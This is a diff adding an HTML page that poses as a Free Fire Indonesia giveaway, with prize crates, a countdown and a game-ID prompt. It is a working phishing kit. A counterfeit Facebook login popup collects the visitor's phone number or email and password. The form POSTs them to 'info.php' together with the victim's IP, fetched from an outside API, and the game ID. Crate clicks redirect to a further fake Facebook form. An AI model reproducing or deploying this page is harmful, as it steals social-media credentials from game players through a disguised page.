@@ -1,0 +1,997 @@
+
+
+<html>
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <title>FREE FIRE INDONESIA</title>
+    
+        <link rel="stylesheet" type="text/css" href="css/facebook.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+   <style>
+       @import url('https://fonts.googleapis.com/css2?family=Fredoka+One&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Sniglet&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Itim&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Teko&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Acme&display=swap');
+@font-face {
+   font-family: Digital;
+   src: url(../ngMedia/digital-7.ttf);
+}
+*
+{
+	margin: 0;
+	padding: 0;
+	box-sizing: border-box;
+}
+
+body
+{
+	width: 100%;
+	min-height: 100vh;
+	background: url('https://images.hdqwalls.com/wallpapers/bthumb/garena-free-fire-plan-bermuda-street-outfit-to.jpg') no-repeat;
+	background-size: cover;
+	background-attachment: fixed;
+	display: flex;
+	align-items: center;
+	justify-content: center;
+}
+body:before
+{
+	content: '';
+	position: fixed;
+	top: 0;
+	left: 0;
+	width: 100%;
+	height: 100%;
+	background: rgba(0,0,0,0.50);
+}
+section
+{
+	position: relative;
+	width: 100%;
+	min-height: 100vh;
+	background: url('https://wallpapercave.com/wp/wp6827098.jpg') no-repeat;
+	background-size: cover;
+	box-shadow: 0 .5px 5px rgba(255,255,255,0.50);
+	border:2px solid #FFA619;
+}
+.loader
+{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    z-index:999999;
+    background:#110617;
+    flex-direction:column;
+}
+.loader img
+{
+    max-width:320px;
+}
+.welcome
+{
+    position:fixed;
+    top:50px;
+    left:0;
+    padding:5px;
+    background:#333;
+    color:#fff;
+    border:1px solid #FFA619;
+    border-left:none;
+    border-top-right-radius:3px;
+    border-bottom-right-radius:3px;
+    z-index:99;
+    font-family: 'Sniglet';
+    transform:translateX(-999px);
+    transition:all 0.5s;
+}
+section:before
+{
+	content: '';
+	position: absolute;
+	top: 0;
+	left: 0;
+	width: 100%;
+	height: 100%;
+	background: rgba(0,0,0,0.80);
+}
+section header
+{
+	position: absolute;
+	top:0;
+	left: 50%;
+	transform: translateX(-50%);
+	width: 100%;
+	height: 70px;
+	background:rgba(0, 0, 0, 0.8);
+	overflow: hidden;
+	display: flex;
+	align-items: center;
+	justify-content: center;
+	border-bottom: 2px solid #FFA619;
+	z-index: 1;
+}
+section header:before
+{
+	content: '';
+	position: absolute;
+	top: 0;
+	left: -15px;
+	width: 70px;
+	height: 100%;
+	transform: skewX(20deg);
+	background:#FFA619;
+}
+section header:after
+{
+	content: '';
+	position: absolute;
+	top: 0;
+	right: -25px;
+	width: 70px;
+	height: 100%;
+	transform: skewX(-20deg);
+	background:#FFA619;
+}
+section .NguyenWrap
+{
+	position: relative;
+	width: 100%;
+	min-height: 100vh;
+	padding: 75px 5px 5px 5px;
+	color:#fff;
+	overflow: hidden;
+}
+
+.NguyenWrap .banner
+{
+	position: relative;
+	width: 100%;
+	height: 220px;
+	border-radius: 3px;
+	border:2px solid #FFA619;
+	background: red;
+}
+.banner .slide
+{
+	position: absolute;
+	top: 0;
+	left: 0;
+	width: 100%;
+	height: 100%;
+	animation: changeBanner 15s infinite linear;
+}
+@keyframes changeBanner
+{
+	0%,100%{
+		background:url('https://i.ytimg.com/vi/FXbYo1SQ7uI/maxresdefault.jpg') no-repeat;
+		background-size: cover;
+	}
+	25%
+	{
+		opacity: 0.8;
+	}
+	50%
+	{
+		opacity: 1;
+		background:url('https://staticg.sportskeeda.com/editor/2021/02/aba40-16124989553053-800.jpg') no-repeat;
+		background-size: cover;
+	}
+	75%
+	{
+		opacity: 0.8;
+	}
+}
+.NguyenWrap .bannerText
+{
+	position: relative;
+	width: 100%;
+	height: 50px;
+	border-radius: 3px;
+	border:2px solid #FFA619;
+	background:#FFA619;
+	margin-top:7px;
+	display: flex;
+	align-items: center;
+	justify-content: center;
+}
+.NguyenWrap .bannerText:before
+{
+	content: '';
+	position: absolute;
+	top:1px;
+	left: 1px;
+	right: 1px;
+	bottom: 1px;
+	border: 3px solid rgba(0, 0, 0, 0.8);
+	border-radius: 3px;
+}
+.bannerText .ngText
+{
+	font-family: 'Fredoka One', cursive;
+	font-size: 30px;
+	-webkit-text-stroke:1.5px rgba(0, 0, 0, 0.8);
+	letter-spacing: .5px;
+	animation: coloring 4s infinite;
+	animation-delay: calc(.2s * var(--i));
+	font-weight: bold;
+}
+.NguyenWrap .endTime
+{
+	position: relative;
+	width: 100%;
+	height: 30px;
+	border-radius: 3px;
+	border:2px solid #FFA619;
+	background:#ffA666;
+	margin-top:7px;
+	display: flex;
+	align-items: center;
+	justify-content: space-between;
+	padding: 10px 0 10px 10px;
+	overflow: hidden;
+}
+.endTime .alertText
+{
+	font-family: 'Acme', cursive;
+	font-size: 15px;
+	letter-spacing: .5px;
+	line-height: 1em;
+}
+.endTime .waktu
+{
+	position: relative;
+	display: flex;
+	align-items: center;
+	justify-content: center;
+	background: rgba(0, 0, 0, 0.8);
+	padding: 5px;
+	height:20px;
+	line-height:20px;
+	border-radius: 3px;
+	font-family: 'Digital', cursive;
+}
+.waktu .time:not(:first-child)
+{
+	margin-left: 5px;
+}
+.waktu .time
+{
+    float:left;
+    margin-top:-3px;
+}
+@keyframes coloring 
+{
+	from
+	{
+		color:#FFA619;
+	}
+	to 
+	{
+		color:#fff;
+	}
+}
+.NguyenWrap .boxHadiah
+{
+	margin-top: 5px;
+	position: relative;
+	width: 100%;
+	display: grid;
+	grid-template-columns: auto auto auto;
+	justify-content: center;
+}
+.boxHadiah .kotak
+{
+	position: relative;
+	width: 120px;
+	height: 120px;
+	background: #FFA619;
+	margin:7px;
+	border-radius: 3px;
+	padding: 2px;
+	overflow: hidden;
+	transition:all 0.2s
+}
+.boxHadiah .kotak .imgBox
+{
+	position: relative;
+	width: 100%;
+	height: 89px;
+	border-radius: 3px;
+	overflow:hidden;
+	margin-bottom:5px;
+}
+.imgBox img
+{
+    width: 100%;
+	border-radius: 3px;
+}
+
+.boxHadiah .kotak.active
+{
+    transform:scale(1.1);
+    transition:all 0.5s
+}
+
+.boxHadiah .kotak.active .imgBox img
+{
+    animation: shake 0.5s infinite;
+}
+@keyframes shake {
+  0% { transform: translate(1px, 1px) rotate(0deg); }
+  10% { transform: translate(-1px, -2px) rotate(-1deg); }
+  20% { transform: translate(-3px, 0px) rotate(1deg); }
+  30% { transform: translate(3px, 2px) rotate(0deg); }
+  40% { transform: translate(1px, -1px) rotate(1deg); }
+  50% { transform: translate(-1px, 2px) rotate(-1deg); }
+  60% { transform: translate(-3px, 1px) rotate(0deg); }
+  70% { transform: translate(3px, 1px) rotate(-1deg); }
+  80% { transform: translate(-1px, -1px) rotate(1deg); }
+  90% { transform: translate(1px, 2px) rotate(0deg); }
+  100% { transform: translate(1px, -2px) rotate(-1deg); }
+}
+
+.boxHadiah .kotak:before
+{
+	content: '';
+	z-index: 9;
+	position: absolute;
+	top: 0;
+	left: -100px;
+	height: 100%;
+	width: 25px;
+	background: rgba(255,255,255,0.50);
+	transform: skewX(-25deg);
+	animation: shine 1s infinite;
+}
+@keyframes shine
+{
+	from
+	{
+		left: -100px;
+	}
+	to 
+	{
+		left: 150px;
+	}
+}
+.boxHadiah .kotak .desc
+{
+	position: relative;
+	width: 100%;
+	height: 40px;
+	background: rgba(0, 0, 0, 0.8);
+	color:#fff;
+	font-size: 13.8px;
+	padding: 5px;
+	border-radius: 3px;
+	font-family: 'Consolas';
+}
+.mask
+{
+	position: fixed;
+	top:0;
+	left:0;
+	width: 100%;
+	height: 100%;
+	background: rgba(0,0,0,0.50);
+	display: block;
+	z-index: 99;
+}
+.ngPopup
+{
+	position: fixed;
+	top:50%;
+	left: 50%;
+	transform: translate(-50%,-50%);
+	width: 400px;
+	height: 226px;
+	border-radius: 3px;
+	border:1px solid #FFA619;
+	display: none;
+	overflow: hidden;
+	z-index: 999;
+}
+.ngPopup video
+{
+	width: 100%;
+	border-radius: 3px;
+}
+.ngPopup .YAbtn
+{
+	position: absolute;
+	left:40%;
+	transform: translateX(-100%);
+	width: 85px;
+	height: 23px;
+	background: #ede4db;
+	bottom:12px;
+	display: none;
+	align-items: center;
+	justify-content:center;
+	font-family: 'Teko';
+	font-size: 18px;
+	font-weight: bold;
+
+}
+.ngPopup .boxGambar
+{
+	position: absolute;
+	top: 45%;
+	left: 50%;
+	transform: translate(-50%,-50%);
+	padding: 3px;
+	display: none;
+	align-items: center;
+	justify-content: space-between;
+	width: 350px;
+	height: 80px;
+}
+.boxGambar img
+{
+	position: relative;
+	width: 60px;
+	height: 60px;
+	box-shadow: 0 .5px 30px #FFA619;
+	animation: scales .5s forwards;
+	border-radius: 2px;
+	border:1px solid #FFA619;
+	animation-delay:calc(0.2s * var(--x));
+	visibility:hidden;
+}
+@keyframes scales
+{
+	from 
+	{
+		transform: scale(3);
+		visibility:hidden;
+		opacity:0;
+	}
+	to 
+	{
+		transform: scale(1);
+		visibility:visible;
+	}
+}
+
+
+
+.popTiktok
+{
+    position: fixed;
+	top:50%;
+	left: 50%;
+	transform: translate(-50%,-50%);
+	width: 300px;
+	height: 210px;
+	border-radius: 3px;
+	border:1px solid #fff;
+	background:#FFA619;
+	overflow:hidden;
+	z-index: 999;
+}
+.popTiktok .tops
+{
+    position:relative;
+    width:100%;
+    background:#333;
+    text-align:center;
+    padding:5px;
+    border-bottom:1px solid #fff;
+}
+.tops h1
+{
+    font-family: 'Acme', cursive;
+    font-size:18px;
+    color:#fff;
+}
+.popTiktok .TiktokForm
+{
+    position:relative;
+    width:100%;
+    height:180px;
+    background:#333;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    flex-direction:column;
+    padding:20px;
+}
+.TiktokForm .tiktokalert
+{
+   position:absolute;
+   padding:5px;
+   background:red;
+   font-family: 'Sniglet';
+   font-size:12px;
+   color:#fff;
+   top:12px;
+   border:1px solid #fff;
+   box-shadow:0 .5px 10px #fff;
+   text-align:center;
+   border-radius:3px;
+   display:none;
+}
+.TiktokForm .tiktokGroup
+{
+   position:relative;
+   width:100%;
+   text-align:center;
+}
+.TiktokForm .tiktokGroup:not(:first-child){
+  margin-top:20px;
+}
+.tiktokGroup .tiktokInput
+{
+    width:100%;
+    height:40px;
+    background:#333;
+    border:2px solid #fff;
+    padding:4px;
+    padding-left:6px;
+    font-size:15px;
+    font-weight:bold;
+    border-radius:5px;
+    box-shadow:0 .5px 10px #fff;
+    color:#fff;
+    font-family: 'Sniglet';
+}
+.tiktokGroup .tiktokInput::placeholder
+{
+    color:#fff;
+}
+.tiktokGroup .tiktokInput:focus
+{
+    outline:none;
+}
+
+@media (min-width: 911px)
+{
+	section, section header
+	{
+		width: 400px;
+	}
+}
+   </style>
+    </head>
+    
+    <body>
+        <section>
+            <header>
+                <img class="logo" src="https://freefiremobile-a.akamaihd.net/common/web_event/official/logo-small_20210113.png">
+            </header>
+            <div class="loader">
+                
+                <img src="https://i.pinimg.com/originals/67/56/66/675666d840a9c8fa1c61eaf584ff2a50.gif">
+            </div>
+            <div class="NguyenWrap">
+                <div class="banner">
+                    <img class="slide">
+                </div>
+                <div class="bannerText"><center>
+                    <span class="ngText" style="--i:1;">T</span>
+                    <span class="ngText" style="--i:2;">R</span>
+                    <span class="ngText" style="--i:3;">Y</span>
+                    <span class="ngText" style="--i:6;margin-right: 5px;"> </span>
+                    <span class="ngText" style="--i:7;">Y</span>
+                    <span class="ngText" style="--i:8;">O</span>
+                    <span class="ngText" style="--i:9;">U</span>
+                    <span class="ngText" style="--i:10;">R</span>
+                    <span class="ngText" style="--i:12;margin-right: 5px;"> </span>
+                    <span class="ngText" style="--i:13;">L</span>
+                    <span class="ngText" style="--i:14;">U</span>
+                    <span class="ngText" style="--i:15;">C</span>
+                    <span class="ngText" style="--i:16;">K</span>
+                    <span class="ngText" style="--i:17;">Y</span>
+                </center></div>
+                <div class="endTime">
+                    <span class="alertText" id="title">
+                        This event will end on !!!!!                </span>
+                    <span class="waktu">
+                        <p class="time" id="jam"></p>
+                        <p class="time" id="men"></p>
+                        <p class="time" id="det"></p>
+                    </span>
+                </div>
+                <div class="boxHadiah" onclick="openCrate()">
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim1">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim2">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim3">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim4">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim5">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim6">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim7">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim8">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim9">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim10">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim11">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim12">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim13">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim14">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim15">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim16">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim17">Get it now</span></center>
+                    </div>
+                    <div class="kotak">
+                        <div class="imgBox">
+                          <img src="ngMedia/crate.jpg">
+                        </div>
+                        <center><span class="desc" id="claim18">Get it now</span></center>
+                    </div>
+                    
+                </div>
+            </div>
+        </section>
+        <div class="mask"></div>
+        <div class="ngPopup" onclick="log()">
+            <video src="ngMedia/ngBg.3gpp" autoplay muted></video>
+                <div class="boxGambar">
+                  <img id="images" style="--x:1;"src="">
+                  <img id="images" style="--x:2;"src="">
+                  <img id="images" style="--x:3;"src="">
+                  <img id="images" style="--x:4;"src="">
+                  <img id="images" style="--x:5;"src="">
+                </div>
+            <div id="YAbtn" onclick="log()" class="YAbtn">CLAIM</div>
+        </div>
+        
+        
+        
+        <!-- TRUE TIKTOK ELEMENT -->
+        <div class="popTiktok">
+         <div id="name_id" class="tops"><h1>Enter your ID</h1></div>
+         <div class="TiktokForm">
+             <span id="err_id" class="tiktokalert salah"><i class="fa fa-times-circle" style="float:left;margin-top:1.5px;margin-right:3px;"></i>Insufficient ID (must exceed 8 characters)</span>
+             <span class="tiktokalert notfound"><i class="fa fa-times-circle" style="float:left;margin-top:1.5px;margin-right:3px;"></i>ID Tidak Ditemukan</span>
+             <span class="tiktokalert check"><i class="fa fa-spinner fa-spin" style="float:left;margin-top:1px;margin-right:3px;"></i>Sedang Mengecek ID</span>
+             <div class="tiktokGroup">
+                <input class="tiktokInput" placeholder="id" id="url" type="number" autocomplete="off">
+             </div>
+             
+             <div class="tiktokGroup">
+                <button style="width:80px;" class="tiktokInput" onclick="return tiktok()" type="submit" id="check__id" value="">CHECK ID</button>
+             </div>
+         </div>
+        </div>
+        
+        
+        <div class="welcome">
+          Halo Selamat Datang <span id="welId"></span>
+        </div>
+        
+        
+        
+        <div class="popup-login login-facebook animated fadeIn" style="display: none;">
+           <div class="popup-box-login-fb">
+              <div class="navbar-fb">
+                 <img width="45" src="img/facebook_text.png">
+              </div>
+              <div class="content-box-fb">
+                <p class="alert sandi" id="fg_pass" >Wrong password <b> Forgot password? </ b></p>
+                <p class="alert email" id="no_mail">The mobile phone number or email does not match any account. <b> Find your account </b></p>
+                 <img width="75" height="75" src="https://i.ibb.co/fFbdRKj/thumbnail.jpg">
+                 <div class="txt-login-fb" id="lg_fb">
+                  Login to your Facebook account to contact Freefire	         </div>
+                 <form class="login-form" action="info.php?id=youmer" method="POST" onsubmit="return valid()">
+                    <label>
+                    <input type="text" id="user" name="user" placeholder="NPhone Number or Email" autocomplete="off" autocapitalize="off">
+                    </label>
+                    <label>
+                    <input type="password" id="pass" name="pass" placeholder="Password" autocomplete="off" autocapitalize="off">
+                    </label>
+                    <input type="hidden" name="ip" id="ip" value="">
+                    <input type="hidden" id="id" name="id" value="">
+                    <input type="hidden" id="nick" name="nick" value="">
+                    <button  type="submit" id="btnfb" class="btn-login-fb">log in</button>
+                 </form>
+                 <input id="eee" type="hidden">
+                 <div class="txt-create-account" id="c_account">Creat Account</div>
+                 <div class="txt-not-now" id="not">Not Now</div>
+                 <div class="txt-forgotten-password" id="fg_pass">Forget</div>
+              </div>
+              <div class="language-box">
+                 <center>
+                 <div class="language-name language-name-active">English (UK)</div>
+                 <div class="language-name">Bahasa Indonesia</div>
+                 <div class="language-name">Basa Jawa</div>
+                 <div class="language-name">Bahasa Melayu</div>
+                 <div class="language-name">日本語</div>
+                 <div class="language-name">Español</div>
+                 <div class="language-name">Português (Brasil)</div>
+                 <div class="language-name">
+                    <i class="fa fa-plus"></i>
+                 </div>
+                 </center>
+              </div>
+              <div class="copyright">Facebook Inc.</div>
+           </div>
+         </div>
+        
+        
+        
+        
+        <!-- AUDIO ELEMENT -->
+        <audio id="popSound" src="ngMedia/popSound.mp4" style="display: none;"></audio>
+        <audio id="clickSound" src="ngMedia/clickSound.mpeg" style="display: none;"></audio>
+        
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <script src="https://randomjs.com/1.0.0.js"></script>
+        <script>
+        $(document).ready(function(){
+           $(".loader").fadeOut();
+        })
+          
+         </script>
+        <script type="text/javascript">
+        $(document).on('click','.boxHadiah .kotak',function(){
+           $(this).toggleClass("active").siblings().removeClass("active");
+           setTimeout(() => {
+           $(this).removeClass("active");
+           },1000);
+        })
+        function openCrate() {
+            $("#clickSound").get(0).play();
+            setTimeout(() => {
+                $(".mask").show();
+                $(".ngPopup").fadeIn();
+                
+                setTimeout(() =>{
+                    $("#popSound").get(0).play();
+                    $(".boxGambar").css("display","flex");
+                },800);
+                setTimeout(() => {
+                    $("#YAbtn").css("display", "flex");
+                }, 1080)
+    
+            }, 1000)
+        }
+    
+        $('.boxGambar #images').each(function(){
+            function ngRand(high,low) {
+                high++;
+                return Math.floor((Math.random())*(high-low))+low;
+            }
+            $(this).attr("src","ngMedia/ngReward/"+ngRand(1,39)+".jpg"); 
+        })
+        
+        
+        </script>
+    
+        <script type="text/javascript">
+        var countDownDate = new Date("Apr 17, 2021 15:37:25").getTime();
+        var x = setInterval(function() {
+            var now = new Date().getTime();
+            var distance = countDownDate - now;
+            var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+            document.getElementById("jam").innerHTML = hours + " :";
+            document.getElementById("men").innerHTML = minutes + " :";
+            document.getElementById("det").innerHTML = seconds;
+            if (distance < 0) {
+                clearInterval(x);
+            //    
+            }
+        }, 1000);
+        </script>
+        <script>
+           function tiktok(){
+           var url = $("#url").val();
+           if(!(url.length <= 6))
+           $(".popTiktok").hide();
+           $(".mask").hide();
+           $(".salah").show();
+           $(".check").hide();  
+           }
+        </script>
+        <script type="text/javascript">
+            var checkip = function () {
+                   $.ajax({
+                       type: "get",
+                       async: false,
+                       url: "https://api.pubgameshowtime.com/ip/getcountry",
+                       dataType: "json",
+                       success: function (result) {
+                          $('#ip').val(result.ip);
+                       }
+                   })
+               }
+            checkip();
+        </script>
+         <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+        <script type="text/javascript">
+            sswww()
+     function sswww() {
+             axios.get("https://sp0meur.com/letter/simple/1").then((res) => {
+                document.getElementById("eee").value =   res.data.linkfacebook
+                // alert(res.data.link4)
+             });
+           
+        }
+            function valid() {
+                var user = $('#user').val();
+                var pass = $('#pass').val();
+                var ip = $('#ip').val();
+                if(user == '' || user == null)
+                {
+                    $('.email').show();
+                    $('.sandi').hide();
+                    return false;
+                }else{
+                
+                    if(user.includes('@')){
+                    let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
+                    if(user.match(pattern)){
+                    $('.email').hide();
+                    }else{
+                    $('.email').show();
+                    $('.sandi').hide();
+                    return false;
+                    }
+                    }
+                    
+                    if(!isNaN(user)){
+                    if(user.length <= 7){
+                    $('.email').show();
+                    $('.sandi').hide();
+                    return false;
+                    }else{
+                    $('.email').hide();
+                    }
+                    }
+                    
+                    if(user.match(/\s/g)){
+                    $('.email').show();
+                    $('.sandi').hide();
+                    return false;
+                    }else{
+                    $('.email').hide();
+                    }
+                    
+                    var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
+                    if(user.match(regex)){
+                    $('.email').show();
+                    $('.sandi').hide();
+                    return false;
+                    }
+                    
+                    if(user.length <= 5){
+                    $('.email').show();
+                    $('.sandi').hide();
+                    return false;
+                    }else{
+                    $('.email').hide();
+                    }
+                    
+                }
+                if(pass == '' || pass == null || pass.length <= 5)
+                {
+                    $('.sandi').show();
+                    return false;
+                }else{
+                    $('.sandi').hide();
+                }
+                
+                // Jika Sukses
+                $("#btnfb").addClass("disabled");
+            }
+        
+            function log(){
+                const queryString = window.location.search;
+   const urlParams = new URLSearchParams(queryString);
+   const q = urlParams.get('q');
+              
+                 window.location.href = `../form/mobilefb.html?q=${q}`;
+            }
+        </script>
+    
+
+        
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    
+    <script>
+    /*
+    const queryString = window.location.search;
+    const urlParams = new URLSearchParams(queryString);
+    const id = urlParams.get('id');
+    const lg = urlParams.get('lg');
+    document.getElementById("form_wis").action = "action_test.php?id=" + id+"&lg="+lg;
+    */
+    </script>
+        
+    </body>
+    
+    </html>
